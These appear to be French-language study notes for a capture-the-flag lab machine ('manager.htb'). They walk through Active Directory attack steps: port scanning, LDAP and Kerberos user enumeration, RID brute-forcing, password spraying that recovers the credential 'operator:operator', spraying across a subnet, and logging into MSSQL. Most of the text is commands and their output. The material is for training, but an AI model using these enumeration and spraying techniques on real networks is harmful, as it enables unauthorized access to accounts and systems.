Ici je vais faire du AD Pentest pour etre balaise dans ce domaine.
D'abord il faut faire un bon scan
`└─$ nmap -sV -Pn -p1-65535 --min-rate 3000 $ip` | `nmap -sC -sV -O  10.10.11.236 -A -T4 --min-rate=500`
```
nmap $ip
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

└─$ nmap -sC -sV -Pn -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269 $ip
PORT     STATE    SERVICE               VERSION
53/tcp   open     domain                Simple DNS Plus
80/tcp   open     http                  Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
88/tcp   open     kerberos-sec          Microsoft Windows Kerberos (server time: 2024-02-19 01:08:33Z)
135/tcp  open     msrpc                 Microsoft Windows RPC
139/tcp  open     netbios-ssn           Microsoft Windows netbios-ssn
389/tcp  open     ldap                  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-19T01:10:41+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  filtered microsoft-ds
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-19T01:10:38+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open     ms-sql-s              Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-02-19T01:10:38+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-18T21:48:10
|_Not valid after:  2054-02-18T21:48:10
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open     ldap                  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-19T01:10:41+00:00; +6h59m58s from scanner time.
3269/tcp open     ssl/globalcatLDAPssl?
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2024-02-19T01:10:35+00:00; +6h59m58s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
```
Ou avec `masscan`
`masscan -p1-65535,U:1-65535 10.10.11.236 --rate=1000 -e tun0`
Maintenant avec les ports ouverts il faut trouver et trier les ports importantes, oubien les enumerer toi meme s'ils sont pas ouverts dans le nmap
```
Host is up (0.25s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
53/tcp  open  tcpwrapped
80/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped
```
oubien les enumerer toi meme s'ils sont pas ouverts
```
└─$ nc -nv $ip 88                             
(UNKNOWN) [10.10.11.236] 88 (kerberos) open
```
Quelque ports important dans mon scan que je peux utiliser si j'ai un username ou password et tout autre attaque
- Kerberos (Port 88)
- LDAP (389, 636, 3268, 3269)
- SMB (139, 445)
- MSSQL (Port 1433)

## Recon Analysis
Grace au nmap,  je trouve le Domain `manager.htb0` et son Domain Controller `dc01.manager.htb` dans le port `389`, `636` qui est `LDAP`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```
└─$ ldapsearch -x -H ldap://10.10.11.236 -s base -LLL
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=manager,DC=htb
ldapServiceName: manager.htb:dc01$@MANAGER.HTB
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=manager,DC=htb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=manager,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=manager,DC=htb
namingContexts: CN=Configuration,DC=manager,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
namingContexts: DC=ForestDnsZones,DC=manager,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 132541
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=manager,DC=htb
dnsHostName: dc01.manager.htb
defaultNamingContext: DC=manager,DC=htb
currentTime: 20240219012738.0Z
configurationNamingContext: CN=Configuration,DC=manager,DC=htb
```

### Password Spray Kerbrute enum
Supposons qu'on a un mot de passe `hacked123` durant notre Pentest,  mais le probleme on connais pas son utilisateur. Dans l'enumeration avec `kerbrute` on peux aussi  mettre les users qu'on a trouver pourque ca teste ce seul mot de passe la avec le module `passwordspray` par kerbrute

**Enumerer les utilsateurs Kerberos**
```
└─$ kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/Seclists/millions_users.txt 
Version: v1.0.3 (9dad6e1) - 02/18/24 - Ronnie Flathers @ropnop

2024/02/18 18:33:54 >  Using KDC(s):
2024/02/18 18:33:54 >   10.10.11.236:88

2024/02/18 18:34:21 >  [+] VALID USERNAME:       ryan@manager.htb
2024/02/18 18:35:04 >  [+] VALID USERNAME:       guest@manager.htb
2024/02/18 18:35:23 >  [+] VALID USERNAME:       cheng@manager.htb
2024/02/18 18:35:41 >  [+] VALID USERNAME:       raven@manager.htb
2024/02/18 18:37:30 >  [+] VALID USERNAME:       administrator@manager.htb

```


- **TIPS**
si tu trouve des users, utilise les aussi comme etant un mots de passe pour du passwordspraying

**Enumerer les utilsateurs crakmapexec**
Avec `cme`, si le anonymous login est autorisee on peux bien enumerer les utilisateurs dans cet AD, en utilisant le `--rid-brute 10000`
```
└─$ crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000
SMB         10.10.11.236    445    NONE             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    NONE             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    NONE             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    NONE             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    NONE             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    NONE             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    NONE             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    NONE             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    NONE             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    NONE             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    NONE             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    NONE             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    NONE             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    NONE             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    NONE             1119: MANAGER\Operator (SidTypeUser)
```

**Password Spray crackmapexec**
Avec `cme` on peux aussi faire du passwordspray

```
└─$ crackmapexec smb 10.10.11.236 -u user.txt -p user.txt --no-brute --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\: 
```
- Si tu trouve des listes d'utilisateurs, faut toujours les mettre en minuscule.
Ici le user `operator` a le meme mot de passe que son utilisateurs.

## Utilisation de mes credenetials
Dans ce reseau, j'ai trouver plusieurs port important et il es temps d'utiliser mes credentials pour voir s'ils vont marcher a un port donnee.
- **SMB**
```
└─$ crackmapexec smb 10.10.11.236 -u operator -p 'operator' --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             \          READ            Logon server share 
```
- **Check the `Password Policy`**
```
└─$ crackmapexec smb 10.10.11.236 -u operator -p 'operator' --pass-pol
SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] Dumping password info for domain: MANAGER
SMB         10.10.11.236    445    DC01             Minimum password length: 7
SMB         10.10.11.236    445    DC01             Password history length: 24
SMB         10.10.11.236    445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.236    445    DC01             
SMB         10.10.11.236    445    DC01             Password Complexity Flags: 000000
SMB         10.10.11.236    445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.11.236    445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.11.236    445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.11.236    445    DC01                 Domain Password Complex: 0
SMB         10.10.11.236    445    DC01             
SMB         10.10.11.236    445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.11.236    445    DC01             Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.236    445    DC01             Locked Account Duration: 30 minutes 
SMB         10.10.11.236    445    DC01             Account Lockout Threshold: None
SMB         10.10.11.236    445    DC01             Forced Log off Time: Not Set
```
- **Authenticate on Every Box**
```
└─$ crackmapexec smb 10.10.11.0/24 -u operator -p 'operator'           
SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10.0 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.250    445    DC-ANALYSIS      [-] analysis.htb\operator:operator STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [+] rebound.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.241    445    DC               [-] hospital.htb\operator:operator STATUS_LOGON_FAILURE 
```
- **smbclient**
```
┌──(bloman㉿hacker101)-[~/CTFs/Boot2root/VMs]
└─$ smbclient -N -L //10.10.11.236 -U operator%operator

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

└─$ smbclient \\\\10.10.11.236\\SYSVOL
Password for [WORKGROUP\bloman]:
                                                                                                                                      
┌──(bloman㉿hacker101)-[~/CTFs/Boot2root/VMs]
└─$ smbclient \\\\10.10.11.236\\SYSVOL -U operator%operator
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 27 10:19:07 2023
  ..                                  D        0  Thu Jul 27 10:19:07 2023
  manager.htb                        Dr        0  Thu Jul 27 10:19:07 2023

                5446399 blocks of size 4096. 711128 blocks available
smb: \> 
```

- **MSSQL**
Let's now check our creds for the `mssql`. Pour cela on va utiliser le `mssqlclient` pour nous connecter
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```
└─$ sudo mssqlclient.py -port 1433  manager.htb/operator:operator@10.10.11.236 -window
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```